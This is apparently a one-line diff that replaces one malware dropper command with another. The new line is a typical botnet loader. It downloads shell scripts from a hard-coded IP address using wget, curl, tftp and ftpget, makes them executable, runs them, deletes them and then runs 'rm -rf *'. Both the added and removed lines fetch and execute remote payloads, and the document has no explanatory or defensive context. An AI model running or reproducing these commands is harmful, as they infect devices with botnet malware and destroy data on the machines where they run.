@@ -1,1 +1,1 @@
-wget http://149.57.138.150/Boota.x86; chmod 777 Boota.x86; ./Boota.x86
+cd /tmp || cd /var/run || cd /mnt || cd /var/run cd /; wget http://193.233.185.152/bot.sh; curl -O http://193.233.185.152/bot.sh; chmod 777 bot.sh; sh bot.sh; tftp 193.233.185.152 -c get tbot.sh; chmod 777 tbot.sh; sh tbot.sh; tftp -r tbot2.sh -g 193.233.185.152; chmod 777 tbot2.sh; sh tbot2.sh; ftpget -v -u anonymous -p anonymous -P 21 193.233.185.152 bot1.sh bot1.sh; sh bot1.sh; rm -rf bot.sh tbot.sh tbot2.sh bot1.sh; rm -rf *
